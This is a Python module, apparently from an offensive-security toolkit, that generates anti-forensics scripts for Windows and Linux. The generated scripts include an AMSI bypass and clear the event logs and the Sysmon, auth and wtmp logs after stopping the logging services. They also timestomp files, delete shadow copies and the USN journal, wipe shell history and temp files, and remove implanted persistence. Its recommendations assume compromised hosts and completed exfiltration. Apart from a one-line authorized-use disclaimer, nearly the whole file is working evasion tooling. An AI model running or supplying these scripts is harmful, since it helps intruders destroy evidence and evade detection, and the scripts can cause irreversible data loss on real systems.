"""
Cleanup Engine
==============
Anti-forensics and artifact removal module

Features:
- Event log clearing (Windows/Linux)
- Artifact removal
- File timestomping
- Persistence removal
- Registry cleanup
- MFT manipulation indicators

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import json
import logging
import struct
import hashlib
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Any, Tuple
from enum import Enum, auto

from cybermodules.helpers import log_to_intel

logger = logging.getLogger("cleanup_engine")


# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class CleanupMethod(Enum):
    """Cleanup operation types"""
    LOG_CLEAR = "log_clear"
    ARTIFACT_REMOVE = "artifact_remove"
    TIMESTOMP = "timestomp"
    REGISTRY_CLEAN = "registry_clean"
    PERSISTENCE_REMOVE = "persistence_remove"
    PROCESS_HOLLOW = "process_hollow"
    MFT_OVERWRITE = "mft_overwrite"


class LogType(Enum):
    """Windows/Linux log types"""
    # Windows
    SECURITY = "Security"
    SYSTEM = "System"
    APPLICATION = "Application"
    POWERSHELL = "Microsoft-Windows-PowerShell/Operational"
    SYSMON = "Microsoft-Windows-Sysmon/Operational"
    DEFENDER = "Microsoft-Windows-Windows Defender/Operational"
    # Linux
    AUTH = "/var/log/auth.log"
    SYSLOG = "/var/log/syslog"
    MESSAGES = "/var/log/messages"
    SECURE = "/var/log/secure"
    AUDIT = "/var/log/audit/audit.log"
    WTMP = "/var/log/wtmp"
    BTMP = "/var/log/btmp"
    LASTLOG = "/var/log/lastlog"


class CleanupAggressiveness(Enum):
    """Cleanup aggressiveness level"""
    MINIMAL = 1  # Only essential cleanup
    STANDARD = 2  # Standard cleanup
    THOROUGH = 3  # Deep cleanup
    PARANOID = 4  # Maximum cleanup, may cause system instability


# ============================================================
# DATACLASSES
# ============================================================

@dataclass
class CleanupTarget:
    """Target for cleanup operation"""
    target_type: str  # file, log, registry, service, etc.
    path: str
    method: CleanupMethod
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class CleanupResult:
    """Result of cleanup operation"""
    target: CleanupTarget
    success: bool
    method_used: str
    error: str = ""
    details: Dict[str, Any] = field(default_factory=dict)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            'target_type': self.target.target_type,
            'path': self.target.path,
            'success': self.success,
            'method_used': self.method_used,
            'error': self.error,
            'details': self.details,
            'timestamp': self.timestamp,
        }


@dataclass
class CleanupPlan:
    """Comprehensive cleanup plan"""
    plan_id: str
    targets: List[CleanupTarget] = field(default_factory=list)
    aggressiveness: CleanupAggressiveness = CleanupAggressiveness.STANDARD
    preserve_persistence: bool = True
    clear_event_logs: bool = True
    timestomp_files: bool = True
    remove_artifacts: bool = True
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


# ============================================================
# CLEANUP ENGINE
# ============================================================

class CleanupEngine:
    """
    Anti-forensics and artifact cleanup engine
    
    Features:
    - Event log manipulation
    - File artifact removal
    - Timestomping
    - Registry cleanup
    - Persistence removal
    """
    
    def __init__(self, scan_id: int = 0, os_type: str = "windows"):
        self.scan_id = scan_id
        self.os_type = os_type.lower()
        self.results: List[CleanupResult] = []
    
    def _log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"CLEANUP_{msg_type}", message)
        logger.info(f"[CLEANUP][{msg_type}] {message}")
    
    # ============================================================
    # EVENT LOG OPERATIONS
    # ============================================================
    
    def generate_log_clear_script(self, log_types: List[LogType] = None) -> str:
        """Generate script to clear event logs"""
        
        if self.os_type == "windows":
            return self._generate_windows_log_clear(log_types)
        else:
            return self._generate_linux_log_clear(log_types)
    
    def _generate_windows_log_clear(self, log_types: List[LogType] = None) -> str:
        """Generate Windows event log clearing script"""
        
        if not log_types:
            log_types = [
                LogType.SECURITY,
                LogType.SYSTEM,
                LogType.APPLICATION,
                LogType.POWERSHELL,
            ]
        
        # PowerShell script to clear logs with evasion
        script = '''
# Event Log Cleaner with Evasion
# Stops event log service, clears logs, restarts

$ErrorActionPreference = "SilentlyContinue"

# Bypass AMSI for this session
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like "*iUtils"} | %{$_.GetField("am"+"siInit"+"Failed", "NonPublic,Static")}
if($a) { $a.SetValue($null, $true) }

# Function to clear specific log
function Clear-SpecificLog {
    param([string]$LogName)
    
    try {
        wevtutil cl $LogName 2>$null
        Write-Host "[+] Cleared: $LogName"
        return $true
    } catch {
        # Try alternative method
        try {
            $log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $LogName
            $log.IsEnabled = $false
            $log.SaveChanges()
            Remove-Item "$env:SystemRoot\\System32\\winevt\\Logs\\$LogName.evtx" -Force -ErrorAction SilentlyContinue
            $log.IsEnabled = $true
            $log.SaveChanges()
            Write-Host "[+] Cleared (alt): $LogName"
            return $true
        } catch {
            Write-Host "[-] Failed: $LogName"
            return $false
        }
    }
}

# Stop event log service temporarily
Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

# Clear specified logs
$logs = @(
'''
        
        for log_type in log_types:
            if hasattr(log_type, 'value'):
                script += f'    "{log_type.value}",\n'
        
        script += '''
)

foreach ($log in $logs) {
    Clear-SpecificLog -LogName $log
}

# Clear additional forensic artifacts
$artifacts = @(
    "$env:TEMP\\*.tmp",
    "$env:TEMP\\*.log",
    "$env:SystemRoot\\Temp\\*.tmp",
    "$env:SystemRoot\\Prefetch\\*.pf",
    "$env:APPDATA\\Microsoft\\Windows\\Recent\\*"
)

foreach ($artifact in $artifacts) {
    Remove-Item $artifact -Force -Recurse -ErrorAction SilentlyContinue
}

# Restart event log service
Start-Service -Name "EventLog" -ErrorAction SilentlyContinue

# Clear PowerShell history
$histPath = "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
if (Test-Path $histPath) {
    Remove-Item $histPath -Force
}

Write-Host "[+] Cleanup completed"
'''
        
        self._log("LOG_CLEAR_WIN", f"Generated Windows log clear script for {len(log_types)} log types")
        return script
    
    def _generate_linux_log_clear(self, log_types: List[LogType] = None) -> str:
        """Generate Linux log clearing script"""
        
        if not log_types:
            log_types = [
                LogType.AUTH,
                LogType.SYSLOG,
                LogType.WTMP,
                LogType.BTMP,
                LogType.LASTLOG,
                LogType.AUDIT,
            ]
        
        script = '''#!/bin/bash
# Linux Log Cleaner with Evasion

# Function to securely clear log
clear_log() {
    local log_path="$1"
    if [ -f "$log_path" ]; then
        # Truncate file
        > "$log_path" 2>/dev/null
        
        # Alternative: overwrite with random data then truncate
        if [ -w "$log_path" ]; then
            dd if=/dev/urandom bs=1K count=10 of="$log_path" 2>/dev/null
            > "$log_path" 2>/dev/null
        fi
        
        echo "[+] Cleared: $log_path"
    fi
}

# Function to clear binary logs
clear_binary_log() {
    local log_path="$1"
    if [ -f "$log_path" ]; then
        > "$log_path" 2>/dev/null
        touch "$log_path"
        echo "[+] Cleared binary: $log_path"
    fi
}

# Stop logging services temporarily
systemctl stop rsyslog 2>/dev/null
systemctl stop syslog 2>/dev/null

# Clear text logs
'''
        
        for log_type in log_types:
            if hasattr(log_type, 'value') and log_type.value.startswith('/'):
                if 'wtmp' in log_type.value or 'btmp' in log_type.value or 'lastlog' in log_type.value:
                    script += f'clear_binary_log "{log_type.value}"\n'
                else:
                    script += f'clear_log "{log_type.value}"\n'
        
        script += '''

# Clear additional logs
for log in /var/log/*.log /var/log/syslog.* /var/log/auth.log.*; do
    clear_log "$log" 2>/dev/null
done

# Clear shell history
> ~/.bash_history 2>/dev/null
> ~/.zsh_history 2>/dev/null
unset HISTFILE
export HISTSIZE=0

# Clear utmp
> /var/run/utmp 2>/dev/null

# Restart logging
systemctl start rsyslog 2>/dev/null
systemctl start syslog 2>/dev/null

# Remove temp files
rm -rf /tmp/* 2>/dev/null
rm -rf /var/tmp/* 2>/dev/null

echo "[+] Cleanup completed"
'''
        
        self._log("LOG_CLEAR_LIN", f"Generated Linux log clear script for {len(log_types)} log types")
        return script
    
    # ============================================================
    # TIMESTOMPING
    # ============================================================
    
    def generate_timestomp_script(
        self,
        file_paths: List[str],
        reference_time: datetime = None
    ) -> str:
        """Generate timestomping script to modify file timestamps"""
        
        if not reference_time:
            # Default to system install time
            reference_time = datetime(2024, 1, 15, 10, 30, 0)
        
        if self.os_type == "windows":
            return self._generate_windows_timestomp(file_paths, reference_time)
        else:
            return self._generate_linux_timestomp(file_paths, reference_time)
    
    def _generate_windows_timestomp(
        self,
        file_paths: List[str],
        reference_time: datetime
    ) -> str:
        """Generate Windows timestomping script"""
        
        time_str = reference_time.strftime('%m/%d/%Y %H:%M:%S')
        
        script = f'''
# Timestomping Script - Windows
# Modifies Creation, Modified, and Access times

$targetTime = [datetime]::ParseExact("{time_str}", "MM/dd/yyyy HH:mm:ss", $null)

function Set-FileTimestamps {{
    param(
        [string]$Path,
        [datetime]$Time
    )
    
    if (Test-Path $Path) {{
        $file = Get-Item $Path -Force
        
        # Set all timestamps
        $file.CreationTime = $Time
        $file.LastWriteTime = $Time
        $file.LastAccessTime = $Time
        
        Write-Host "[+] Timestomped: $Path"
        return $true
    }} else {{
        Write-Host "[-] Not found: $Path"
        return $false
    }}
}}

# Alternative method using .NET
function Set-FileTimestampsAdvanced {{
    param(
        [string]$Path,
        [datetime]$Time
    )
    
    try {{
        [System.IO.File]::SetCreationTime($Path, $Time)
        [System.IO.File]::SetLastWriteTime($Path, $Time)
        [System.IO.File]::SetLastAccessTime($Path, $Time)
        
        # Also set for directory
        if ([System.IO.Directory]::Exists($Path)) {{
            [System.IO.Directory]::SetCreationTime($Path, $Time)
            [System.IO.Directory]::SetLastWriteTime($Path, $Time)
            [System.IO.Directory]::SetLastAccessTime($Path, $Time)
        }}
        
        Write-Host "[+] Timestomped (adv): $Path"
        return $true
    }} catch {{
        Write-Host "[-] Failed: $Path - $($_.Exception.Message)"
        return $false
    }}
}}

# Target files
$files = @(
'''
        
        for path in file_paths:
            script += f'    "{path}",\n'
        
        script += '''
)

foreach ($file in $files) {
    Set-FileTimestamps -Path $file -Time $targetTime
}

Write-Host "[+] Timestomping completed"
'''
        
        self._log("TIMESTOMP_WIN", f"Generated timestomp script for {len(file_paths)} files")
        return script
    
    def _generate_linux_timestomp(
        self,
        file_paths: List[str],
        reference_time: datetime
    ) -> str:
        """Generate Linux timestomping script"""
        
        time_str = reference_time.strftime('%Y%m%d%H%M.%S')
        
        script = f'''#!/bin/bash
# Timestomping Script - Linux
# Uses touch with timestamp

TARGET_TIME="{time_str}"

timestomp_file() {{
    local file="$1"
    if [ -e "$file" ]; then
        # Set modification and access time
        touch -t "$TARGET_TIME" "$file" 2>/dev/null
        
        # For changing ctime, need to change system time briefly (requires root)
        # This is risky and usually avoided
        
        echo "[+] Timestomped: $file"
    else
        echo "[-] Not found: $file"
    fi
}}

# Alternative using debugfs for ext filesystems (requires root)
timestomp_ext() {{
    local file="$1"
    local inode=$(stat -c %i "$file" 2>/dev/null)
    local device=$(df "$file" | tail -1 | awk '{{print $1}}')
    
    if [ -n "$inode" ] && [ -n "$device" ]; then
        # This requires unmounting or using debugfs
        echo "[*] inode: $inode on $device (manual debugfs needed)"
    fi
}}

# Target files
'''
        
        for path in file_paths:
            script += f'timestomp_file "{path}"\n'
        
        script += '''

echo "[+] Timestomping completed"
'''
        
        self._log("TIMESTOMP_LIN", f"Generated timestomp script for {len(file_paths)} files")
        return script
    
    # ============================================================
    # ARTIFACT REMOVAL
    # ============================================================
    
    def generate_artifact_removal_script(
        self,
        artifacts: List[str] = None,
        aggressiveness: CleanupAggressiveness = CleanupAggressiveness.STANDARD
    ) -> str:
        """Generate artifact removal script"""
        
        if self.os_type == "windows":
            return self._generate_windows_artifact_removal(artifacts, aggressiveness)
        else:
            return self._generate_linux_artifact_removal(artifacts, aggressiveness)
    
    def _generate_windows_artifact_removal(
        self,
        artifacts: List[str],
        aggressiveness: CleanupAggressiveness
    ) -> str:
        """Generate Windows artifact removal script"""
        
        script = '''
# Windows Artifact Removal Script

$ErrorActionPreference = "SilentlyContinue"

function Remove-Artifact {
    param([string]$Path)
    
    if (Test-Path $Path) {
        # Try to remove read-only attribute
        $item = Get-Item $Path -Force
        if ($item.Attributes -band [System.IO.FileAttributes]::ReadOnly) {
            $item.Attributes = $item.Attributes -bxor [System.IO.FileAttributes]::ReadOnly
        }
        
        Remove-Item $Path -Force -Recurse -ErrorAction SilentlyContinue
        
        if (!(Test-Path $Path)) {
            Write-Host "[+] Removed: $Path"
            return $true
        }
    }
    return $false
}

function Secure-Delete {
    param([string]$Path)
    
    if (Test-Path $Path -PathType Leaf) {
        $fs = [System.IO.File]::OpenWrite($Path)
        $size = $fs.Length
        $bytes = New-Object byte[] 4096
        (New-Object Random).NextBytes($bytes)
        
        for ($i = 0; $i -lt $size; $i += 4096) {
            $fs.Write($bytes, 0, [Math]::Min(4096, $size - $i))
        }
        $fs.Close()
        Remove-Item $Path -Force
        Write-Host "[+] Secure deleted: $Path"
    }
}

# Standard artifacts
$standardArtifacts = @(
'''
        
        # Add default Windows artifacts
        default_artifacts = [
            "$env:TEMP\\*.tmp",
            "$env:TEMP\\*.exe",
            "$env:TEMP\\*.dll",
            "$env:TEMP\\*.ps1",
            "$env:TEMP\\*.bat",
            "$env:TEMP\\*.vbs",
            "$env:LOCALAPPDATA\\Temp\\*",
            "$env:SystemRoot\\Temp\\*.tmp",
            "$env:SystemRoot\\Prefetch\\*.pf",
            "$env:APPDATA\\Microsoft\\Windows\\Recent\\*",
        ]
        
        if aggressiveness.value >= CleanupAggressiveness.THOROUGH.value:
            default_artifacts.extend([
                "$env:USERPROFILE\\Downloads\\*.exe",
                "$env:SystemRoot\\System32\\winevt\\Logs\\*.evtx",
            ])
        
        for artifact in default_artifacts:
            script += f'    "{artifact}",\n'
        
        if artifacts:
            for artifact in artifacts:
                script += f'    "{artifact}",\n'
        
        script += '''
)

foreach ($artifact in $standardArtifacts) {
    Get-Item $artifact -ErrorAction SilentlyContinue | ForEach-Object {
        Remove-Artifact -Path $_.FullName
    }
}
'''
        
        if aggressiveness.value >= CleanupAggressiveness.THOROUGH.value:
            script += '''
# Thorough cleanup
# Clear MRU lists
$mruPaths = @(
    "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
    "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs"
)
foreach ($mru in $mruPaths) {
    if (Test-Path $mru) {
        Remove-ItemProperty -Path $mru -Name * -ErrorAction SilentlyContinue
    }
}

# Clear DNS cache
ipconfig /flushdns | Out-Null

# Clear thumbnail cache
Remove-Item "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*" -Force -ErrorAction SilentlyContinue
'''
        
        if aggressiveness.value >= CleanupAggressiveness.PARANOID.value:
            script += '''
# Paranoid cleanup
# Clear USN Journal (requires admin)
fsutil usn deletejournal /d C: 2>$null

# Clear Volume Shadow Copies (requires admin)
vssadmin delete shadows /all /quiet 2>$null

# Clear Recycle Bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
'''
        
        script += '''
Write-Host "[+] Artifact removal completed"
'''
        
        self._log("ARTIFACT_WIN", f"Generated artifact removal script (aggressiveness: {aggressiveness.name})")
        return script
    
    def _generate_linux_artifact_removal(
        self,
        artifacts: List[str],
        aggressiveness: CleanupAggressiveness
    ) -> str:
        """Generate Linux artifact removal script"""
        
        script = '''#!/bin/bash
# Linux Artifact Removal Script

remove_artifact() {
    local path="$1"
    if [ -e "$path" ]; then
        rm -rf "$path" 2>/dev/null && echo "[+] Removed: $path"
    fi
}

secure_delete() {
    local path="$1"
    if [ -f "$path" ]; then
        shred -vfz -n 3 "$path" 2>/dev/null
        rm -f "$path" 2>/dev/null
        echo "[+] Secure deleted: $path"
    fi
}

# Standard artifacts
'''
        
        # Default Linux artifacts
        default_artifacts = [
            "/tmp/*.tmp",
            "/tmp/.*",
            "/var/tmp/*",
            "/dev/shm/*",
            "~/.bash_history",
            "~/.zsh_history",
            "~/.python_history",
            "~/.wget-hsts",
            "~/.lesshst",
            "~/.viminfo",
        ]
        
        if aggressiveness.value >= CleanupAggressiveness.THOROUGH.value:
            default_artifacts.extend([
                "~/.cache/*",
                "~/.local/share/recently-used.xbel",
                "/var/log/*.log",
                "/var/log/*.gz",
            ])
        
        for artifact in default_artifacts:
            script += f'remove_artifact "{artifact}"\n'
        
        if artifacts:
            for artifact in artifacts:
                script += f'remove_artifact "{artifact}"\n'
        
        if aggressiveness.value >= CleanupAggressiveness.THOROUGH.value:
            script += '''
# Clear systemd journal
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null

# Clear package manager cache
apt-get clean 2>/dev/null
yum clean all 2>/dev/null
'''
        
        if aggressiveness.value >= CleanupAggressiveness.PARANOID.value:
            script += '''
# Paranoid cleanup
# Clear swap
swapoff -a 2>/dev/null
swapon -a 2>/dev/null

# Clear memory caches
sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null

# Fill free space with zeros (DANGEROUS - takes long time)
# dd if=/dev/zero of=/tmp/zero bs=4M 2>/dev/null
# rm -f /tmp/zero
'''
        
        script += '''
echo "[+] Artifact removal completed"
'''
        
        self._log("ARTIFACT_LIN", f"Generated artifact removal script (aggressiveness: {aggressiveness.name})")
        return script
    
    # ============================================================
    # PERSISTENCE REMOVAL
    # ============================================================
    
    def generate_persistence_removal_script(
        self,
        persistence_records: List[Dict]
    ) -> str:
        """Generate script to remove installed persistence"""
        
        if self.os_type == "windows":
            return self._generate_windows_persistence_removal(persistence_records)
        else:
            return self._generate_linux_persistence_removal(persistence_records)
    
    def _generate_windows_persistence_removal(
        self,
        persistence_records: List[Dict]
    ) -> str:
        """Generate Windows persistence removal script"""
        
        script = '''
# Windows Persistence Removal Script

$ErrorActionPreference = "SilentlyContinue"

function Remove-ScheduledTaskPersistence {
    param([string]$TaskName)
    
    schtasks /delete /tn "$TaskName" /f 2>$null
    if ($?) {
        Write-Host "[+] Removed scheduled task: $TaskName"
        return $true
    }
    return $false
}

function Remove-RegistryPersistence {
    param([string]$KeyName)
    
    $paths = @(
        "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            $val = Get-ItemProperty -Path $path -Name $KeyName -ErrorAction SilentlyContinue
            if ($val) {
                Remove-ItemProperty -Path $path -Name $KeyName -Force
                Write-Host "[+] Removed registry key: $path\\$KeyName"
                return $true
            }
        }
    }
    return $false
}

function Remove-WMIPersistence {
    param([string]$SubscriptionName)
    
    # Remove WMI filter
    Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter | 
        Where-Object { $_.Name -like "*$SubscriptionName*" } | 
        ForEach-Object { $_.Delete(); Write-Host "[+] Removed WMI filter: $($_.Name)" }
    
    # Remove WMI consumer
    Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer | 
        Where-Object { $_.Name -like "*$SubscriptionName*" } | 
        ForEach-Object { $_.Delete(); Write-Host "[+] Removed WMI consumer: $($_.Name)" }
    
    # Remove WMI binding
    Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding | 
        Where-Object { $_.Filter -like "*$SubscriptionName*" -or $_.Consumer -like "*$SubscriptionName*" } | 
        ForEach-Object { $_.Delete(); Write-Host "[+] Removed WMI binding" }
}

function Remove-ServicePersistence {
    param([string]$ServiceName)
    
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    sc.exe delete $ServiceName 2>$null
    Write-Host "[+] Removed service: $ServiceName"
}

# Remove installed persistence
'''
        
        for record in persistence_records:
            method = record.get('method', '')
            params = record.get('params', {})
            
            if method == 'scheduled_task':
                task_name = params.get('task_name', '')
                script += f'Remove-ScheduledTaskPersistence -TaskName "{task_name}"\n'
            elif method == 'registry_run':
                key_name = params.get('key_name', '')
                script += f'Remove-RegistryPersistence -KeyName "{key_name}"\n'
            elif method == 'wmi_subscription':
                sub_name = params.get('name', '')
                script += f'Remove-WMIPersistence -SubscriptionName "{sub_name}"\n'
            elif method == 'service':
                service_name = params.get('service_name', '')
                script += f'Remove-ServicePersistence -ServiceName "{service_name}"\n'
        
        script += '''
Write-Host "[+] Persistence removal completed"
'''
        
        self._log("PERSIST_REMOVE_WIN", f"Generated persistence removal for {len(persistence_records)} items")
        return script
    
    def _generate_linux_persistence_removal(
        self,
        persistence_records: List[Dict]
    ) -> str:
        """Generate Linux persistence removal script"""
        
        script = '''#!/bin/bash
# Linux Persistence Removal Script

remove_cron() {
    local pattern="$1"
    crontab -l 2>/dev/null | grep -v "$pattern" | crontab -
    echo "[+] Removed cron entries matching: $pattern"
}

remove_systemd_service() {
    local service="$1"
    systemctl stop "$service" 2>/dev/null
    systemctl disable "$service" 2>/dev/null
    rm -f "/etc/systemd/system/$service.service" 2>/dev/null
    rm -f "/lib/systemd/system/$service.service" 2>/dev/null
    systemctl daemon-reload
    echo "[+] Removed systemd service: $service"
}

remove_ssh_key() {
    local key_pattern="$1"
    sed -i "/$key_pattern/d" ~/.ssh/authorized_keys 2>/dev/null
    echo "[+] Removed SSH key matching: $key_pattern"
}

remove_profile_backdoor() {
    local pattern="$1"
    sed -i "/$pattern/d" ~/.bashrc 2>/dev/null
    sed -i "/$pattern/d" ~/.bash_profile 2>/dev/null
    sed -i "/$pattern/d" ~/.profile 2>/dev/null
    sed -i "/$pattern/d" /etc/profile 2>/dev/null
    echo "[+] Removed profile backdoor: $pattern"
}

remove_init_script() {
    local script_name="$1"
    rm -f "/etc/init.d/$script_name" 2>/dev/null
    update-rc.d -f "$script_name" remove 2>/dev/null
    echo "[+] Removed init script: $script_name"
}

# Remove installed persistence
'''
        
        for record in persistence_records:
            method = record.get('method', '')
            params = record.get('params', {})
            
            if method == 'cron':
                pattern = params.get('pattern', 'beacon')
                script += f'remove_cron "{pattern}"\n'
            elif method == 'systemd':
                service_name = params.get('service_name', '')
                script += f'remove_systemd_service "{service_name}"\n'
            elif method == 'ssh_key':
                key = params.get('key_comment', 'backdoor')
                script += f'remove_ssh_key "{key}"\n'
            elif method == 'profile_backdoor':
                pattern = params.get('pattern', 'beacon')
                script += f'remove_profile_backdoor "{pattern}"\n'
            elif method == 'init_d':
                script_name = params.get('script_name', '')
                script += f'remove_init_script "{script_name}"\n'
        
        script += '''
echo "[+] Persistence removal completed"
'''
        
        self._log("PERSIST_REMOVE_LIN", f"Generated persistence removal for {len(persistence_records)} items")
        return script
    
    # ============================================================
    # FULL CLEANUP PLAN
    # ============================================================
    
    def create_cleanup_plan(
        self,
        persistence_records: List[Dict] = None,
        artifacts: List[str] = None,
        timestomp_files: List[str] = None,
        aggressiveness: CleanupAggressiveness = CleanupAggressiveness.STANDARD
    ) -> str:
        """Create a comprehensive cleanup script combining all methods"""
        
        import uuid
        plan_id = str(uuid.uuid4())[:8]
        
        if self.os_type == "windows":
            header = f'''
# ==============================================================================
# FULL CLEANUP PLAN - {plan_id}
# Generated: {datetime.now().isoformat()}
# OS: Windows
# Aggressiveness: {aggressiveness.name}
# ==============================================================================

$ErrorActionPreference = "SilentlyContinue"
Write-Host "=== Starting Full Cleanup Plan {plan_id} ==="
Write-Host ""

'''
        else:
            header = f'''#!/bin/bash
# ==============================================================================
# FULL CLEANUP PLAN - {plan_id}
# Generated: {datetime.now().isoformat()}
# OS: Linux
# Aggressiveness: {aggressiveness.name}
# ==============================================================================

echo "=== Starting Full Cleanup Plan {plan_id} ==="
echo ""

'''
        
        script = header
        
        # Add event log clearing
        script += '''
# === PHASE 1: EVENT LOG CLEARING ===
'''
        script += self.generate_log_clear_script()
        
        # Add artifact removal
        script += '''
# === PHASE 2: ARTIFACT REMOVAL ===
'''
        script += self.generate_artifact_removal_script(artifacts, aggressiveness)
        
        # Add timestomping
        if timestomp_files:
            script += '''
# === PHASE 3: TIMESTOMPING ===
'''
            script += self.generate_timestomp_script(timestomp_files)
        
        # Add persistence removal if requested
        if persistence_records:
            script += '''
# === PHASE 4: PERSISTENCE REMOVAL ===
'''
            script += self.generate_persistence_removal_script(persistence_records)
        
        # Footer
        if self.os_type == "windows":
            script += f'''
Write-Host ""
Write-Host "=== Cleanup Plan {plan_id} Completed ==="
'''
        else:
            script += f'''
echo ""
echo "=== Cleanup Plan {plan_id} Completed ==="
'''
        
        self._log("PLAN_CREATED", f"Created cleanup plan {plan_id} ({aggressiveness.name})")
        return script
    
    def get_cleanup_recommendations(self, chain_state: Dict) -> List[str]:
        """Get cleanup recommendations based on chain state"""
        recommendations = []
        
        # Check compromised hosts
        hosts = chain_state.get('compromised_hosts', [])
        if hosts:
            recommendations.append(f"Clear logs on {len(hosts)} compromised hosts")
        
        # Check installed persistence
        persistence = chain_state.get('installed_persistence', [])
        if persistence:
            recommendations.append(f"Remove {len(persistence)} persistence mechanisms")
        
        # Check collected loot
        loot = chain_state.get('collected_loot', [])
        if loot:
            recommendations.append("Secure delete staging files after exfiltration")
        
        # General recommendations
        recommendations.extend([
            "Timestomp any dropped files to match system DLL dates",
            "Clear PowerShell history and console host history",
            "Remove any scheduled tasks created during operation",
            "Clear prefetch files (*.pf) for executed tools",
        ])
        
        return recommendations


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    # Enums
    'CleanupMethod',
    'LogType',
    'CleanupAggressiveness',
    
    # Dataclasses
    'CleanupTarget',
    'CleanupResult',
    'CleanupPlan',
    
    # Main class
    'CleanupEngine',
]
